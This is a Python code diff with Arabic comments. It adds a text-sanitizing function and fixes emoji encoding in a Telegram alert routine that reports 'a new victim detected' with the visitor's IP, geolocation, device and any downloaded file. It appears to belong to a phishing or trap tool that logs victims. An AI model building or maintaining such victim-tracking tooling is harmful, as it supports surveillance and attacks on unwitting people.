@@ -16,6 +16,17 @@ logger = logging.getLogger(__name__)
 
 # ============= دوال Telegram الموحدة =============
 
+def sanitize_text(text):
+    """تطهير نص رسالة تلجرام من الرموز غير الصالحة"""
+    try:
+        # تنظيف النص باستخدام UTF-8 مع تجاهل الأخطاء
+        if isinstance(text, str):
+            return text.encode('utf-8', 'ignore').decode('utf-8', 'ignore')
+        return str(text).encode('utf-8', 'ignore').decode('utf-8', 'ignore')
+    except Exception as e:
+        logger.debug(f"Error sanitizing text: {e}")
+        return "[Error in message]"
+
 def send_telegram_alert(ip, trap_name, device="Unknown", file_name=""):
     """إرسال تنبيه إلى Telegram عند اكتشاف ضحية أو تحميل ملف"""
     token = config.get_key("TELEGRAM_BOT_TOKEN")
@@ -37,7 +48,7 @@ def send_telegram_alert(ip, trap_name, device="Unknown", file_name=""):
     except Exception as e:
         logger.error(f"Error fetching geo data: {e}")
 
-    file_info = f"\ud83d\udcc4 الملف: {file_name}" if file_name else ""
+    file_info = f"📄 الملف: {file_name}" if file_name else ""
     message = f"""
 🎯 تنبيه: تم اكتشاف ضحية جديدة!
 
@@ -51,6 +62,9 @@ def send_telegram_alert(ip, trap_name, device="Unknown", file_name=""):
 ⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
     """
     
+    # تطهير الرسالة قبل الإرسال
+    message = sanitize_text(message)
+    
     try:
         response = requests.post(
             f"https://api.telegram.org/bot{token}/sendMessage",
@@ -59,7 +73,7 @@ def send_telegram_alert(ip, trap_name, device="Unknown", file_name=""):
         )
         return response.status_code == 200
     except Exception as e:
-        logger.error(f"Error sending Telegram alert: {e}")
+        logger.error(f"Error sending Telegram alert: {sanitize_text(str(e))}")
         return False
 
 # ============= دوال تسجيل الضحايا الموحدة =============
